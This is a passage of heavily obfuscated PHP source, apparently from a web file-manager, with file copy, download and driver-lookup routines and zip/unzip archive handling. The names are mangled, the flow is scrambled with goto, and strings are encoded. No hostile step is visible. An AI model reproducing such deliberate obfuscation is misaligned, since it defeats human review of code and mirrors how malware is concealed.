$eï¼§Âñ¢¦); $d´“ë§½ö— = $a•‘˜†¶äÏ[1003] . time() . rand_string(5); goto DÜê’İÆ°ó; e¦ˆÉß™Ø: $cÊ¥Šç®× = $dºöÒÜ÷’‡->iconvApp($cÊ¥Šç®×); $AÉ¬…å©¦ê = $D“¢˜ŒÎô§->upload($aÓã­¹×á—, $cÊ¥Šç®×, $eœÁ÷¼²„); self::remove($D›±É…ÅÙÆ . $d´“ë§½ö—); goto Cˆèœ¼²í; B–Œ…Şë÷º: mk_dir($D›±É…ÅÙÆ); $cÊ¥Šç®× = $D›±É…ÅÙÆ . $d´“ë§½ö—; $cÊ¥Šç®× = $dºöÒÜ÷’‡->download($bÒÏ÷Å‹¤Ò, $cÊ¥Šç®×); goto e¦ˆÉß™Ø; DÜê’İÆ°ó: Hook::trigger($a•‘˜†¶äÏ[1004], $dºöÒÜ÷’‡, $bÒÏ÷Å‹¤Ò, $D“¢˜ŒÎô§, $aÓã­¹×á—, $eï¼§Âñ¢¦, $d´“ë§½ö—); if (self::driverIsSame($dºöÒÜ÷’‡, $D“¢˜ŒÎô§)) { if ($eœÁ÷¼²„) { $AÉ¬…å©¦ê = $D“¢˜ŒÎô§->moveFile($bÒÏ÷Å‹¤Ò, $aÓã­¹×á—); } else { $AÉ¬…å©¦ê = $D“¢˜ŒÎô§->copyFile($bÒÏ÷Å‹¤Ò, $aÓã­¹×á—); } Hook::trigger($a•‘˜†¶äÏ[1005], $dºöÒÜ÷’‡, $bÒÏ÷Å‹¤Ò, $D“¢˜ŒÎô§, $aÓã­¹×á—, $eï¼§Âñ¢¦, $AÉ¬…å©¦ê); return $AÉ¬…å©¦ê; } $D›±É…ÅÙÆ = TEMP_FILES; goto B–Œ…Şë÷º; bƒº…Á­ë: } public static function pathFather($eç®ëÍ õƒ) { $e­ŞŠç¡¾ã = IO::init($eç®ëÍ õƒ); $dõƒÁ°ÕãÆ = $e­ŞŠç¡¾ã->pathFather($e­ŞŠç¡¾ã->path); return $e­ŞŠç¡¾ã->getPathOuter($dõƒÁ°ÕãÆ); } public static function fileOut($D°—Šî³ÔÀ, $B‰ïæ¡ñÄ± = false, $aªƒ‰‰È¥ = false, $cÛÎ¾â¢Ç = '') { $d½ïŞÙ®ŸÀ = self::driverMake($D°—Šî³ÔÀ); if ($d½ïŞÙ®ŸÀ->isFileOutServer()) { return $d½ïŞÙ®ŸÀ->fileOutServer($D°—Šî³ÔÀ, $B‰ïæ¡ñÄ±, $aªƒ‰‰È¥, $cÛÎ¾â¢Ç); } return $d½ïŞÙ®ŸÀ->fileOut($D°—Šî³ÔÀ, $B‰ïæ¡ñÄ±, $aªƒ‰‰È¥, $cÛÎ¾â¢Ç); } public static function fileOutImage($bõÏƒµ×ˆ, $fù¾ó˜ò›¨ = 250) { $dÄè¶˜ˆÂ‰ = array(250, 600, 1200, 3000); for ($fñ˜ÑÈÔáê = 0; $fñ˜ÑÈÔáê < count($dÄè¶˜ˆÂ‰); $fñ˜ÑÈÔáê++) { if ($fñ˜ÑÈÔáê == 0 && $fù¾ó˜ò›¨ <= $dÄè¶˜ˆÂ‰[$fñ˜ÑÈÔáê]) { $fù¾ó˜ò›¨ = $dÄè¶˜ˆÂ‰[$fñ˜ÑÈÔáê]; break; } else { if ($fù¾ó˜ò›¨ > $dÄè¶˜ˆÂ‰[$fñ˜ÑÈÔáê - 1] && $fù¾ó˜ò›¨ <= $dÄè¶˜ˆÂ‰[$fñ˜ÑÈÔáê]) { $fù¾ó˜ò›¨ = $dÄè¶˜ˆÂ‰[$fñ˜ÑÈÔáê]; break; } else { if ($fñ˜ÑÈÔáê == count($dÄè¶˜ˆÂ‰) - 1 && $fù¾ó˜ò›¨ > $dÄè¶˜ˆÂ‰[$fñ˜ÑÈÔáê]) { $fù¾ó˜ò›¨ = $dÄè¶˜ˆÂ‰[$fñ˜ÑÈÔáê]; break; } } } } $Fß•­»ÕŸö = self::driverMake($bõÏƒµ×ˆ); if ($Fß•­»ÕŸö->isFileOutServer()) { return $Fß•­»ÕŸö->fileOutImageServer($bõÏƒµ×ˆ, $fù¾ó˜ò›¨); } return $Fß•­»ÕŸö->fileOutImage($bõÏƒµ×ˆ, $fù¾ó˜ò›¨); } private static function driverIsSame($D›‚Ç»ö†, $E…ÍÉÆÑ˜ä) { goto f¾ŒÃ£Ú¼; dõ¶‡Âí©«: if ($AÆÑ«å¿Èå != $fœ½¶”¿­Ë) { return !1; } if ($AÆÑ«å¿Èå == $d±®œŠÃ[697]) { return !0; } if ($AÆÑ«å¿Èå == $d±®œŠÃ[103]) { return !0; } goto FÅ÷«’æ; FÅ÷«’æ: if ($D›‚Ç»ö†->pathDriver == $E…ÍÉÆÑ˜ä->pathDriver) { return !0; } return !1; goto cä¬å­ Şò; f¾ŒÃ£Ú¼: $d±®œŠÃ =& $_SERVER[Äº¡•ô™Ÿ]; $AÆÑ«å¿Èå = $D›‚Ç»ö†->getType(); $fœ½¶”¿­Ë = $E…ÍÉÆÑ˜ä->getType(); goto dõ¶‡Âí©«; cä¬å­ Şò: } public static function copyUpdate($FŒåÌÉòí‘, $EØ«£¾çäÈ) { goto D…‡øÌÛ; C‚Ë‘‰ôÉ: $A †Óèä©§ = array(); foreach ($eŸ®¢È‰ãç as $f¢Õï‘ïÓ => $B§íŸ¥Åî) { if (isset($eÚ°Ï„¬´ã[$f¢Õï‘ïÓ])) { if ($B§íŸ¥Åî[$A®çõÁøÛ¬[76]] == 1) { continue; } if ($eÚ°Ï„¬´ã[$f¢Õï‘ïÓ][$A®çõÁøÛ¬[77]] == $B§íŸ¥Åî[$A®çõÁøÛ¬[77]]) { continue; } } if ($B§íŸ¥Åî[$A®çõÁøÛ¬[76]] == 1) { $A †Óèä©§[] = $EØ«£¾çäÈ . $A®çõÁøÛ¬[8] . $f¢Õï‘ïÓ; continue; } $dø¡ÙÙÇ‚² = strstr(trim($f¢Õï‘ïÓ, $A®çõÁøÛ¬[8]), $A®çõÁøÛ¬[8]) ? get_path_father($f¢Õï‘ïÓ) : $A®çõÁøÛ¬[33]; $eîÀêÓ¿[] = array($A®çõÁøÛ¬[1006] => $B§íŸ¥Åî[$A®çõÁøÛ¬[75]], $A®çõÁøÛ¬[1007] => rtrim($EØ«£¾çäÈ, $A®çõÁøÛ¬[8]) . $A®çõÁøÛ¬[8] . $dø¡ÙÙÇ‚², $A®çõÁøÛ¬[1008] => $B§íŸ¥Åî); } $E¿‡âÔ°œŸ = array($A®çõÁøÛ¬[164] => $eîÀêÓ¿, $A®çõÁøÛ¬[76] => $A †Óèä©§); goto CàĞøÚ‰Í³; CàĞøÚ‰Í³: Hook::trigger($A®çõÁøÛ¬[1009], $FŒåÌÉòí‘, $EØ«£¾çäÈ, $E¿‡âÔ°œŸ); foreach ($A †Óèä©§ as $B§íŸ¥Åî) { IO::mkdir($B§íŸ¥Åî); } foreach ($eîÀêÓ¿ as $B§íŸ¥Åî) { IO::copy($B§íŸ¥Åî[$A®çõÁøÛ¬[1006]], $B§íŸ¥Åî[$A®çõÁøÛ¬[1007]], REPEAT_REPLACE); } goto eØ¨ÓŸŞâ; Eó›Ö­…Ï™: $eŸ®¢È‰ãç = self::_listAll($FŒåÌÉòí‘); $eÚ°Ï„¬´ã = self::_listAll($EØ«£¾çäÈ); $eîÀêÓ¿ = array(); goto C‚Ë‘‰ôÉ; D…‡øÌÛ: $A®çõÁøÛ¬ =& $_SERVER[Äº¡•ô™Ÿ]; if (!IO::exist($FŒåÌÉòí‘)) { return !1; } if (!IO::exist($EØ«£¾çäÈ)) { IO::mkdir($EØ«£¾çäÈ); } goto Eó›Ö­…Ï™; eØ¨ÓŸŞâ: } private static function _listAll($Bƒİªï’·á) { $f‚Ã÷ÔÎ  =& $_SERVER[Äº¡•ô™Ÿ]; $Bƒİªï’·á = KodIO::clear($Bƒİªï’·á); $A¼æê¤Ìà˜ = IO::listAll($Bƒİªï’·á); foreach ($A¼æê¤Ìà˜ as &$FËØ†„šò) { $Fƒ„Ö–±ƒ¹ = substr($FËØ†„šò[$f‚Ã÷ÔÎ [75]], strlen($Bƒİªï’·á)); $FËØ†„šò[$f‚Ã÷ÔÎ [1010]] = trim($Fƒ„Ö–±ƒ¹, $f‚Ã÷ÔÎ [8]); } return array_to_keyvalue($A¼æê¤Ìà˜, $f‚Ã÷ÔÎ [1010]); } public static function fileSubstr($c¹²±ë©±À, $A×¾æ‘¡Ñ, $F¸ôÉ‡»‰£ = false) { goto E×î°‰…§ì; F¿ï‰È§–Œ: $A„õÛç¸Àè = $F¸ôÉ‡»‰£; if ($A×¾æ‘¡Ñ < 0) { $A×¾æ‘¡Ñ = $A¸õŒˆÄ˜ + $A×¾æ‘¡Ñ; } if ($F¸ôÉ‡»‰£ === !1) { $F¸ôÉ‡»‰£ = $A¸õŒˆÄ˜ - $A×¾æ‘¡Ñ; } goto cÁ×Ë¸ÏĞ¬; E×î°‰…§ì: $C…²¼®’—ç = self::driverMake($c¹²±ë©±À); $A¸õŒˆÄ˜ = $C…²¼®’—ç->size($c¹²±ë©±À); $aó®îÃ¶¸‡ = $A×¾æ‘¡Ñ; goto F¿ï‰È§–Œ; cÁ×Ë¸ÏĞ¬: if ($A×¾æ‘¡Ñ + $F¸ôÉ‡»‰£ > $A¸õŒˆÄ˜) { $F¸ôÉ‡»‰£ = $A¸õŒˆÄ˜ - $A×¾æ‘¡Ñ; } if ($F¸ôÉ‡»‰£ <= 0) { return $_SERVER[Äº¡•ô™Ÿ][33]; } if ($A×¾æ‘¡Ñ < 0 || $A×¾æ‘¡Ñ >= $A¸õŒˆÄ˜ || $F¸ôÉ‡»‰£ > 1024 * 1024 * 5) { throw new Exception("\146\151\x6c\145\122\145\x61\x64\40\145\x72\162\157\162\41\x20\163\164\141\x72\164\x3d{$A×¾æ‘¡Ñ}\73\x6c\x65\x6e\x67\164\x68\x3d{$F¸ôÉ‡»‰£}\73\40\163\x69\x7a\x65\75{$A¸õŒˆÄ˜}\x3b"); } goto cÈ’ôÛœâõ; cÈ’ôÛœâõ: return $C…²¼®’—ç->fileSubstr($c¹²±ë©±À, $A×¾æ‘¡Ñ, $F¸ôÉ‡»‰£); goto F·¾‚¡İÊ¢; F·¾‚¡İÊ¢: } private static function driverMake(&$bÒÄ éôÊÌ) { goto b°™´Éâ‚Ã; b°™´Éâ‚Ã: $fìĞºšÀÌæ =& $_SERVER[Äº¡•ô™Ÿ]; $DÔÔ±öÜĞˆ = KodIO::parse($bÒÄ éôÊÌ); if (!self::$driverListSystem) { $b³™£ŠÔİ¯ = Model($fìĞºšÀÌæ[707])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($b³™£ŠÔİ¯, $fìĞºšÀÌæ[364]); } goto bµù¢‘µÍ¨; D–¶æÔˆï: return $e–‘œñ»‹ƒ; goto Fé­‡Ö‰á; bµù¢‘µÍ¨: if ($DÔÔ±öÜĞˆ[$fìĞºšÀÌæ[29]] == KodIO::KOD_IO && !self::$driverListSystem[$DÔÔ±öÜĞˆ[$fìĞºšÀÌæ[364]]]) { return !1; } $bÒÄ éôÊÌ = $DÔÔ±öÜĞˆ[$fìĞºšÀÌæ[1011]]; $e–‘œñ»‹ƒ = self::driverGet($DÔÔ±öÜĞˆ, $bÒÄ éôÊÌ); goto D–¶æÔˆï; Fé­‡Ö‰á: } private static function driverGet($A¬ÜÕó°´, &$FÀ¢öà·‘î) { goto eÉï§ª‡Ú’; eÉï§ª‡Ú’: $B‰æ¿´âøñ =& $_SERVER[Äº¡•ô™Ÿ]; $FÌšï˜„’ = $A¬ÜÕó°´[$B‰æ¿´âøñ[1012]]; $eËéÉ…½… = $A¬ÜÕó°´[$B‰æ¿´âøñ[364]]; goto aÂ„Ã·ìĞ¡; FÛ©¨ŞÍƒô: $c¶Ç§Ñõ¢Ì->path = $FÀ¢öà·‘î; return $c¶Ç§Ñõ¢Ì; goto Fˆã¥Ÿ°§ñ; aÂ„Ã·ìĞ¡: switch ($A¬ÜÕó°´[$B‰æ¿´âøñ[29]]) { case KodIO::KOD_IO: $dñ—ƒ·¯ = self::$driverListSystem[$eËéÉ…½…]; break; case KodIO::KOD_SOURCE: $FÀ¢öà·‘î = $eËéÉ…½… . $FÀ¢öà·‘î; $dñ—ƒ·¯ = array($B‰æ¿´âøñ[1013] => $B‰æ¿´âøñ[1014], $B‰æ¿´âøñ[6] => $A¬ÜÕó°´); break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $c®ğÄ¡ñÜˆ = $GLOBALS[$B‰æ¿´âøñ[1015]]; self::$driverListUser = array_to_keyvalue($c®ğÄ¡ñÜˆ, $B‰æ¿´âøñ[364]); } $dñ—ƒ·¯ = self::$driverListUser[$eËéÉ…½…]; break; case KodIO::KOD_SHARE_LINK: $dñ—ƒ·¯ = array($B‰æ¿´âøñ[1013] => $B‰æ¿´âøñ[1016], $B‰æ¿´âøñ[6] => $A¬ÜÕó°´); $fÛĞœäñÁŞ = Action($B‰æ¿´âøñ[1017])->sharePathInfo($A¬ÜÕó°´[$B‰æ¿´âøñ[75]]); $FÀ¢öà·‘î = $fÛĞœäñÁŞ[$B‰æ¿´âøñ[366]]; if (!$fÛĞœäñÁŞ[$B‰æ¿´âøñ[366]]) { $a†ìÌçĞŸĞ = Model($B‰æ¿´âøñ[532])->getInfo($fÛĞœäñÁŞ[$B‰æ¿´âøñ[437]]); $FÀ¢öà·‘î = KodIO::clear($a†ìÌçĞŸĞ[$B‰æ¿´âøñ[1018]] . $A¬ÜÕó°´[$B‰æ¿´âøñ[1011]]); $A¬ÜÕó°´[$B‰æ¿´âøñ[435]] = $a†ìÌçĞŸĞ; $A¬ÜÕó°´[$B‰æ¿´âøñ[998]] = $FÀ¢öà·‘î; $dñ—ƒ·¯ = array($B‰æ¿´âøñ[1013] => $B‰æ¿´âøñ[1019], $B‰æ¿´âøñ[6] => $A¬ÜÕó°´); } break; case KodIO::KOD_SHARE_ITEM: $dñ—ƒ·¯ = array($B‰æ¿´âøñ[1013] => $B‰æ¿´âøñ[1020], $B‰æ¿´âøñ[6] => $A¬ÜÕó°´); $a†ìÌçĞŸĞ = Model($B‰æ¿´âøñ[532])->getInfo($A¬ÜÕó°´[$B‰æ¿´âøñ[364]]); if ($a†ìÌçĞŸĞ[$B‰æ¿´âøñ[366]] == $B‰æ¿´âøñ[464]) { $FÀ¢öà·‘î = KodIO::clear($a†ìÌçĞŸĞ[$B‰æ¿´âøñ[1018]] . $A¬ÜÕó°´[$B‰æ¿´âøñ[1011]]); $A¬ÜÕó°´[$B‰æ¿´âøñ[435]] = $a†ìÌçĞŸĞ; $A¬ÜÕó°´[$B‰æ¿´âøñ[998]] = $FÀ¢öà·‘î; $dñ—ƒ·¯ = array($B‰æ¿´âøñ[1013] => $B‰æ¿´âøñ[1021], $B‰æ¿´âøñ[6] => $A¬ÜÕó°´); } break; default: $FÀ¢öà·‘î = $A¬ÜÕó°´[$B‰æ¿´âøñ[75]]; $dñ—ƒ·¯ = array($B‰æ¿´âøñ[1013] => $B‰æ¿´âøñ[1022]); break; } $e¦Å¢Ìİ¼ã = $A¬ÜÕó°´[$B‰æ¿´âøñ[75]]; if (!isset(self::$driverCache[$e¦Å¢Ìİ¼ã])) { $A¤´î¨ÑÈ‹ = strtolower($dñ—ƒ·¯[$B‰æ¿´âøñ[90]]); $cºÓ‡ˆß† = $GLOBALS[$B‰æ¿´âøñ[6]][$B‰æ¿´âøñ[84]][$B‰æ¿´âøñ[1023]]; $d§‹‹Šä®‚ = $B‰æ¿´âøñ[71] . (isset($cºÓ‡ˆß†[$A¤´î¨ÑÈ‹]) ? $cºÓ‡ˆß†[$A¤´î¨ÑÈ‹] : ucfirst($A¤´î¨ÑÈ‹)); if (!class_exists($d§‹‹Šä®‚)) { show_json("{$d§‹‹Šä®‚}\40\x6e\157\164\40\145\x78\x69\x73\x74\163\41", !1); } $DÒŞ’¤“Ûƒ = isset($dñ—ƒ·¯[$B‰æ¿´âøñ[6]]) ? $dñ—ƒ·¯[$B‰æ¿´âøñ[6]] : !1; self::$driverCache[$e¦Å¢Ìİ¼ã] = new $d§‹‹Šä®‚($DÒŞ’¤“Ûƒ); } goto aĞ„Ëï›à¦; aĞ„Ëï›à¦: $c¶Ç§Ñõ¢Ì = self::$driverCache[$e¦Å¢Ìİ¼ã]; $c¶Ç§Ñõ¢Ì->pathDriver = $FÌšï˜„’; $c¶Ç§Ñõ¢Ì->pathBase = $B‰æ¿´âøñ[33]; goto e¡Õ§èÓ”—; e¡Õ§èÓ”—: if (isset($dñ—ƒ·¯[$B‰æ¿´âøñ[6]][$B‰æ¿´âøñ[1024]])) { $c¶Ç§Ñõ¢Ì->pathBase = rtrim($dñ—ƒ·¯[$B‰æ¿´âøñ[6]][$B‰æ¿´âøñ[1024]], $B‰æ¿´âøñ[8]) . $B‰æ¿´âøñ[8]; $FÀ¢öà·‘î = $c¶Ç§Ñõ¢Ì->pathBase . ltrim($FÀ¢öà·‘î, $B‰æ¿´âøñ[8]); } $FÀ¢öà·‘î = $c¶Ç§Ñõ¢Ì->getPath($FÀ¢öà·‘î); if (isset($A¬ÜÕó°´[$B‰æ¿´âøñ[998]])) { $FÀ¢öà·‘î = $A¬ÜÕó°´[$B‰æ¿´âøñ[998]]; } goto FÛ©¨ŞÍƒô; Fˆã¥Ÿ°§ñ: } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $CÎ¤›â™á¤; if (!$CÎ¤›â™á¤) { $C¿Ìóìäé = IO::init($_SERVER[Äº¡•ô™Ÿ][8]); } return $C¿Ìóìäé; } private static function iconvSystem($c•¹ƒÌˆ¼) { return self::local()->iconvSystem($c•¹ƒÌˆ¼); } private static function iconvApp($A’Ö¦ŒäÉä) { return self::local()->iconvApp($A’Ö¦ŒäÉä); } public static function zip($dÊµèÅÏì», $AšåÀ¶áÊá = "\x7a\151\x70", $e™ÄïÇ¦ìù = '', $a®İöÊ™Ç• = REPEAT_RENAME) { goto FßÑê¨ÌÑ; B­öóŸ³øÒ: if (count($cÛëÚÌ¡á—) > 1) { $d­­¢Á ¹ƒ = IO::info(IO::pathFather($Cå¾ŞÒ—Ú[$DÄøå••º¦[75]])); $FŠÖÚ×š—¨ = $d­­¢Á ¹ƒ[$DÄøå••º¦[28]]; } $Eì™õğ âé = $FÛá²„„ò; if (!$Eì™õğ âé) { $Eì™õğ âé = get_path_father($Cå¾ŞÒ—Ú[$DÄøå••º¦[75]]); $bïÓ¼Å«ÅÄ = IO::info($Eì™õğ âé); if (!$bïÓ¼Å«ÅÄ[$DÄøå••º¦[186]]) { show_json(LNG($DÄøå••º¦[1026]), !1); } } goto dÉš¦ÑÂàÙ; dÉš¦ÑÂàÙ: $bÎÃŠà•Ì = $Eì™õğ âé . $FŠÖÚ×š—¨ . $DÄøå••º¦[93] . $AšåÀ¶áÊá; $bÎÃŠà•Ì = get_filename_auto($bÎÃŠà•Ì, $DÄøå••º¦[33], $a®İöÊ™Ç•); $D»â¤†³Ê = self::iconvSystem($bÎÃŠà•Ì); goto aº“œÇ„Ú«; aº“œÇ„Ú«: foreach ($cÛëÚÌ¡á— as $C©Æ¬°ŒâË => $FÈˆ½å„‡Å) { $cÛëÚÌ¡á—[$C©Æ¬°ŒâË] = self::iconvSystem($FÈˆ½å„‡Å); } KodArchive::create($D»â¤†³Ê, $cÛëÚÌ¡á—); if (!IO::exist($bÎÃŠà•Ì)) { if ($FÛá²„„ò) { del_dir($FÛá²„„ò); } show_json(LNG($DÄøå••º¦[1027]), !1); } goto Fï‘¢Ø¡â¢; FßÑê¨ÌÑ: $DÄøå••º¦ =& $_SERVER[Äº¡•ô™Ÿ]; $B¼ŸöÊá¤æ = self::init($dÊµèÅÏì»[0][$DÄøå••º¦[75]]); $Cå¾ŞÒ—Ú = self::info($dÊµèÅÏì»[0][$DÄøå••º¦[75]]); goto b•»ôÎ¯ÕÛ; Fï‘¢Ø¡â¢: if ($e™ÄïÇ¦ìù || !$FÛá²„„ò) { if ($FÛá²„„ò && strstr($FÛá²„„ò, TEMP_FILES)) { $CÄ¬é³¹ÉÄ = $cÛëÚÌ¡á— = array(); recursion_dir($Eì™õğ âé, $CÄ¬é³¹ÉÄ, $cÛëÚÌ¡á—, 0); foreach ($CÄ¬é³¹ÉÄ as $a‘¹µÌ“ÅÛ) { del_dir($a‘¹µÌ“ÅÛ); } foreach ($cÛëÚÌ¡á— as $b…¨‰’É) { if ($b…¨‰’É == $D»â¤†³Ê) { continue; } del_file($b…¨‰’É); } } return $bÎÃŠà•Ì; } $eª´éÉÙ©¨ = self::pathFather($Cå¾ŞÒ—Ú[$DÄøå••º¦[75]]); $BÉ°…Ç¼ = self::move($bÎÃŠà•Ì, $eª´éÉÙ©¨, $a®İöÊ™Ç•); goto Fƒè£ßØ¯; Fƒè£ßØ¯: if (!$BÉ°…Ç¼) { del_dir($FÛá²„„ò); show_json(LNG($DÄøå••º¦[1027]), !1); } del_dir($FÛá²„„ò); return $BÉ°…Ç¼; goto aŒÂ“¤‚‡; b•»ôÎ¯ÕÛ: $FÛá²„„ò = !1; if (!$e™ÄïÇ¦ìù && $B¼ŸöÊá¤æ->getType() == $DÄøå••º¦[103]) { $cÛëÚÌ¡á— = self::zipFileList($dÊµèÅÏì»); } else { $FÛá²„„ò = $e™ÄïÇ¦ìù ? $e™ÄïÇ¦ìù : TEMP_FILES . $DÄøå••º¦[1025] . time() . rand_string(8) . $DÄøå••º¦[8]; mk_dir($FÛá²„„ò); $cÛëÚÌ¡á— = self::zipFileList($dÊµèÅÏì», $FÛá²„„ò); } $FŠÖÚ×š—¨ = $Cå¾ŞÒ—Ú[$DÄøå••º¦[28]]; goto B­öóŸ³øÒ; aŒÂ“¤‚‡: } public static function unzip($BÀİñÓ–„, $c–âĞíËã = "\162\x65\160\154\x61\x63\x65") { goto DÊù’ÁÕ„; DÊù’ÁÕ„: $cî—®¨âÏ =& $_SERVER[Äº¡•ô™Ÿ]; $bìÈšàõ·³ = $BÀİñÓ–„[$cî—®¨âÏ[75]]; $fŸ¢ ¨¹à¶ = $BÀİñÓ–„[$cî—®¨âÏ[1028]]; goto AŠ•Ï›÷‹ö; FÎÍÎ¬¤í«: mk_dir($dšîŞòä›”); $c…ê•˜•¨à = self::fileExt($càÙ˜è´‘); $FÓ¾¾Íˆ˜ = $dšîŞòä›” . $cî—®¨âÏ[93] . $c…ê•˜•¨à; goto a«œéÇõ£½; a«œéÇõ£½: if (!@file_exists(self::iconvSystem($FÓ¾¾Íˆ˜))) { $C¼ê‹Î×ø = self::localFilePath($bìÈšàõ·³, $c…ê•˜•¨à); $FÓ¾¾Íˆ˜ = $C¼ê‹Î×ø ? $C¼ê‹Î×ø : parent::download($bìÈšàõ·³, $FÓ¾¾Íˆ˜); } $FÓ¾¾Íˆ˜ = self::iconvSystem($FÓ¾¾Íˆ˜); $cï’Òˆ²’× = isset($BÀİñÓ–„[$cî—®¨âÏ[1030]]) ? $BÀİñÓ–„[$cî—®¨âÏ[1030]] : $cî—®¨âÏ[1031]; goto då»Ê÷Û×¤; då»Ê÷Û×¤: $dï¤è…¬Â = KodArchive::extract($FÓ¾¾Íˆ˜, $dšîŞòä›” . $cî—®¨âÏ[8], $cï’Òˆ²’×); self::archiveExt(); if (!$dï¤è…¬Â[$cî—®¨âÏ[1032]]) { show_json($cî—®¨âÏ[1033] . $dï¤è…¬Â[$cî—®¨âÏ[1034]], !1); } goto f¶˜ƒ«É¢¤; f¶˜ƒ«É¢¤: Hook::trigger($cî—®¨âÏ[1035], $dšîŞòä›”); recursion_dir($dšîŞòä›”, $c¿¹†Œ–Ó¾, $C‰‹¾ÊÇØ, 0); $b’È®ÎœÂ‡ = array_merge($c¿¹†Œ–Ó¾, $C‰‹¾ÊÇØ); goto D ›Æ—ˆ; cÓ°ŸÎÀùÇ: return !0; goto A§‰²…ÍÓ¸; Dñê÷±ê°ƒ: $DÌƒæÃè§‚ = self::tmpFileName($càÙ˜è´‘); $dšîŞòä›” = TEMP_FILES . $DÌƒæÃè§‚; del_dir($dšîŞòä›”); goto FÎÍÎ¬¤í«; D ›Æ—ˆ: foreach ($b’È®ÎœÂ‡ as $fó©éÙÓã·) { $fó©éÙÓã· = self::iconvApp($fó©éÙÓã·); self::move($fó©éÙÓã·, $fŸ¢ ¨¹à¶, $c–âĞíËã); } del_dir($dšîŞòä›”); if (!$C¼ê‹Î×ø) { del_file($FÓ¾¾Íˆ˜); } goto cÓ°ŸÎÀùÇ; AŠ•Ï›÷‹ö: if (!($càÙ˜è´‘ = parent::info($bìÈšàõ·³))) { show_json(LNG($cî—®¨âÏ[1029]), !1); } if (!($d†…êë¥äæ = parent::infoFull($fŸ¢ ¨¹à¶))) { $fŸ¢ ¨¹à¶ = parent::mkdir($fŸ¢ ¨¹à¶); $d†…êë¥äæ = array($cî—®¨âÏ[75] => $fŸ¢ ¨¹à¶); } else { if (isset($d†…êë¥äæ[$cî—®¨âÏ[366]]) && trim($d†…êë¥äæ[$cî—®¨âÏ[75]], $cî—®¨âÏ[8]) != trim($fŸ¢ ¨¹à¶, $cî—®¨âÏ[8])) { $e†“£¬º  = KodIO::make($d†…êë¥äæ[$cî—®¨âÏ[457]]); $BÌ®‚×†ç… = parent::fileNameAuto($e†“£¬º , $d†…êë¥äæ[$cî—®¨âÏ[28]], REPEAT_RENAME_FOLDER, !0); $fŸ¢ ¨¹à¶ = parent::mkdir($e†“£¬º  . $BÌ®‚×†ç…); $d†…êë¥äæ = array($cî—®¨âÏ[75] => $fŸ¢ ¨¹à¶); } } $fŸ¢ ¨¹à¶ = $d†…êë¥äæ[$cî—®¨âÏ[75]]; goto Dñê÷±ê°ƒ; A§‰²…ÍÓ¸: } public static function unzipList($C‹äÇ˜Ñ³à) { goto b¥—­¢šµ•; b¥—­¢šµ•: $BÂÂê£’‚ =& $_SERVER[Äº¡•ô™Ÿ]; $c¸çµù¿Ÿ = $C‹äÇ˜Ñ³à[$BÂÂê£’‚[75]]; $dïøíÛÄÑ = isset($C‹äÇ˜Ñ³à[$BÂÂê£’‚[1036]]) ? $C‹äÇ˜Ñ³à[$BÂÂê£’‚[1036]] : -1; goto bÑ’İÓõˆŸ; fè‹‡ÉÈ–‡: $B‡ŒËš²Åá = json_encode($c‰øËÖ‰§Æ[$BÂÂê£’‚[1034]]); self::setContent($f¦¨Š‚¦ñ, $B‡ŒËš²Åá); if (count($c‰øËÖ‰§Æ[$BÂÂê£’‚[1034]]) >= $fó‘‘·†ò…) { show_json(sprintf(LNG($BÂÂê£’‚[1038]), count($c‰øËÖ‰§Æ[$BÂÂê£’‚[1034]])), !1); } goto eÇÙÀß¬£Ú; eîñ´êå: if (isset($F°•ğ©ÃÒ)) { $E¯Áªîô‘Š = array($F°•ğ©ÃÒ[$BÂÂê£’‚[75]], $F°•ğ©ÃÒ[$BÂÂê£’‚[1036]], $F°•ğ©ÃÒ[$BÂÂê£’‚[28]]); $céœœõŠ„¸ = md5(implode($BÂÂê£’‚[70], $E¯Áªîô‘Š)) . $BÂÂê£’‚[93] . get_path_ext($F°•ğ©ÃÒ[$BÂÂê£’‚[28]]); } else { $E¯Áªîô‘Š = array($aÊ”â²ñäÚ[$BÂÂê£’‚[28]], $aÊ”â²ñäÚ[$BÂÂê£’‚[75]], $aÊ”â²ñäÚ[$BÂÂê£’‚[77]]); $céœœõŠ„¸ = md5(implode($BÂÂê£’‚[70], $E¯Áªîô‘Š)) . $BÂÂê£’‚[93] . $eĞÜ×à¬ÙØ; } if ($dïøíÛÄÑ == -1) { $f¦¨Š‚¦ñ = IO_PATH_SYSTEM_TEMP . "\x7a\x69\160\126\151\145\167\x2f{$EŒ˜©¢°ã}\x2f{$céœœõŠ„¸}\x2e\x6c\157\147"; $e¯‰¦•¨Ä¯ = self::infoFull($f¦¨Š‚¦ñ); if ($e¯‰¦•¨Ä¯) { $f¦¨Š‚¦ñ = $e¯‰¦•¨Ä¯[$BÂÂê£’‚[75]]; $d æá¾¿ø = self::getContent($f¦¨Š‚¦ñ); if ($d æá¾¿ø) { $B‡ŒËš²Åá = json_decode($d æá¾¿ø, !0); if (count($B‡ŒËš²Åá) >= $fó‘‘·†ò…) { show_json(sprintf(LNG($BÂÂê£’‚[1038]), count($B‡ŒËš²Åá)), !1); } return $B‡ŒËš²Åá; } } else { $f¦¨Š‚¦ñ = self::mkfile($f¦¨Š‚¦ñ); } } $fŞ›òÍ¿åç = TEMP_FILES . $EŒ˜©¢°ã; goto B·¦ëîŒ–±; b±ÏøçêÎõ: self::archiveExt(); del_dir($fŞ›òÍ¿åç); if (!$c‰øËÖ‰§Æ[$BÂÂê£’‚[1032]]) { show_json($c‰øËÖ‰§Æ[$BÂÂê£’‚[1034]], !1); } goto fè‹‡ÉÈ–‡; fé¦—õçÄ÷: $B‡©”íø•ç = self::iconvSystem($B‡©”íø•ç); if ($dïøíÛÄÑ >= 0) { $F‘ïƒ‚­İ = isset($C‹äÇ˜Ñ³à[$BÂÂê£’‚[1040]]) ? $C‹äÇ˜Ñ³à[$BÂÂê£’‚[1040]] : !1; $DÈÎÔÀŸŒ® = isset($C‹äÇ˜Ñ³à[$BÂÂê£’‚[28]]) ? $C‹äÇ˜Ñ³à[$BÂÂê£’‚[28]] : $BÂÂê£’‚[33]; KodArchive::filePreview($B‡©”íø•ç, $dïøíÛÄÑ, $F‘ïƒ‚­İ, $DÈÎÔÀŸŒ®); self::archiveExt(); die; } $c‰øËÖ‰§Æ = KodArchive::listContent($B‡©”íø•ç); goto b±ÏøçêÎõ; B·¦ëîŒ–±: if (!is_dir($fŞ›òÍ¿åç)) { mk_dir($fŞ›òÍ¿åç); } $B‡©”íø•ç = $fŞ›òÍ¿åç . 